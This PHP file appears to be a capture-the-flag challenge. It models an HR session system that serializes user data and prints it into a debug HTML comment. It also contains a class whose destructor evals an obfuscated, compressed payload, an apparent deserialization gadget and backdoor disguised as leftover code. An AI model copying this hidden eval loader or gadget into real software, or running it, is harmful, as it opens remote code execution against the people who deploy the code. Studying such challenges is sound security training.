<?php
class UserSessionz
{
    protected $user;
    public $role;
    function __construct($user, $role)
    {
        $this->user = $user;
        $this->role = $role;
    }
}
function save_sessionz($user, $pass)
{
    $sess = new UserSessionz($user.$pass, "user");
    $data = serialize($sess);
    // LongCat: i don't want to save null values 
    // to our company data storage directly so i just replace them with 0x00
    $data = str_replace('\0', '0x00', $data);
    
    $_SESSION["username"] = $user;
    $_SESSION["data"] = $data;
    return uniqid('hr_system_');
}

function load_sessionz()
{
    $data = $_SESSION["data"];
    echo "<!-- debug\r\n".$data."\r\n\r\n";
    return $data;
}

// an unknown php class inserted by a github member
// it has never been called anyway. seems harmless.
// i am not sure if something will be broken if i remove it.
// i think i can just ignore this for now.
class MilitaryHacker
{
    protected $tmp;
    protected $count;
    protected $len;

    function __construct($tmp)
    {
        $this->tmp = $tmp;
    }

    function __destruct()
    {
        if ($this->count === 'flag.txt') {
            eval(gzinflate(base64_decode(strrev('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'))));
        }
    }
}
